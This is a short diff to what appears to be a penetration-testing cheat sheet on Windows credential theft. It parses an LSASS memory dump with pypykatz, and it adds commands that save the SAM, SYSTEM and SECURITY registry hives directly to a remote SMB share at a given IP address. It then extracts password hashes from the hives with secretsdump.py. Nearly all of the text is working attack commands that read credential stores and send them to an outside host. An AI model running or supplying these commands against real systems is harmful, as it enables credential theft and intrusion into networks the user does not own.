@@ -56,6 +56,11 @@ pypykatz lsa minidump /path/to/lsassdumpfile
 # Save and move registry hives
 reg.exe save hklm\sam C:\sam.save
 move sam.save \\<ip>\NameofFileShare
+---
+reg save HKLM\SAM \\10.10.15.178\CompData\sam.save
+reg save HKLM\SYSTEM \\10.10.15.178\CompData\system.save
+reg save HKLM\SECURITY \\10.10.15.178\CompData\security.save
+---
 
 # Dump password hashes using secretsdump.py
 python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
